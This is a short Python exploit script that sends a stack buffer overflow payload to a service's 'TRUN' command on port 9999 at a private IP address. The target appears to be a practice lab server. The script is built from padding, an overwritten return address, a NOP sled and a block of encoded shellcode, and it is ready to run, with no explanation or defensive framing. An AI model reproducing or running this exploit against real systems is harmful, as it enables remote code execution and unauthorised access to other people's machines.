#!/usr/bin/python3

import sys, socket
from time import sleep

overflow = (b""
b"\xd9\xce\xba\x93\xf7\x41\xdd\xd9\x74\x24\xf4\x5b\x31"
b"\xc9\xb1\x52\x31\x53\x17\x03\x53\x17\x83\x78\x0b\xa3"
b"\x28\x82\x1c\xa6\xd3\x7a\xdd\xc7\x5a\x9f\xec\xc7\x39"
b"\xd4\x5f\xf8\x4a\xb8\x53\x73\x1e\x28\xe7\xf1\xb7\x5f"
b"\x40\xbf\xe1\x6e\x51\xec\xd2\xf1\xd1\xef\x06\xd1\xe8"
b"\x3f\x5b\x10\x2c\x5d\x96\x40\xe5\x29\x05\x74\x82\x64"
b"\x96\xff\xd8\x69\x9e\x1c\xa8\x88\x8f\xb3\xa2\xd2\x0f"
b"\x32\x66\x6f\x06\x2c\x6b\x4a\xd0\xc7\x5f\x20\xe3\x01"
b"\xae\xc9\x48\x6c\x1e\x38\x90\xa9\x99\xa3\xe7\xc3\xd9"
b"\x5e\xf0\x10\xa3\x84\x75\x82\x03\x4e\x2d\x6e\xb5\x83"
b"\xa8\xe5\xb9\x68\xbe\xa1\xdd\x6f\x13\xda\xda\xe4\x92"
b"\x0c\x6b\xbe\xb0\x88\x37\x64\xd8\x89\x9d\xcb\xe5\xc9"
b"\x7d\xb3\x43\x82\x90\xa0\xf9\xc9\xfc\x05\x30\xf1\xfc"
b"\x01\x43\x82\xce\x8e\xff\x0c\x63\x46\x26\xcb\x84\x7d"
b"\x9e\x43\x7b\x7e\xdf\x4a\xb8\x2a\x8f\xe4\x69\x53\x44"
b"\xf4\x96\x86\xcb\xa4\x38\x79\xac\x14\xf9\x29\x44\x7e"
b"\xf6\x16\x74\x81\xdc\x3e\x1f\x78\xb7\x80\x48\xa9\x95"
b"\x69\x8b\xad\x39\x91\x02\x4b\x53\x75\x43\xc4\xcc\xec"
b"\xce\x9e\x6d\xf0\xc4\xdb\xae\x7a\xeb\x1c\x60\x8b\x86"
b"\x0e\x15\x7b\xdd\x6c\xb0\x84\xcb\x18\x5e\x16\x90\xd8"
b"\x29\x0b\x0f\x8f\x7e\xfd\x46\x45\x93\xa4\xf0\x7b\x6e"
b"\x30\x3a\x3f\xb5\x81\xc5\xbe\x38\xbd\xe1\xd0\x84\x3e"
b"\xae\x84\x58\x69\x78\x72\x1f\xc3\xca\x2c\xc9\xb8\x84"
b"\xb8\x8c\xf2\x16\xbe\x90\xde\xe0\x5e\x20\xb7\xb4\x61"
b"\x8d\x5f\x31\x1a\xf3\xff\xbe\xf1\xb7\xe0\x5c\xd3\xcd"
b"\x88\xf8\xb6\x6f\xd5\xfa\x6d\xb3\xe0\x78\x87\x4c\x17"
b"\x60\xe2\x49\x53\x26\x1f\x20\xcc\xc3\x1f\x97\xed\xc1")

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + overflow

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.43.54',9999))

    payload = b"TRUN /.:/" + shellcode

    s.send((payload))
    s.close()
except:
    print ("Error connecting to server")
    sys.exit()
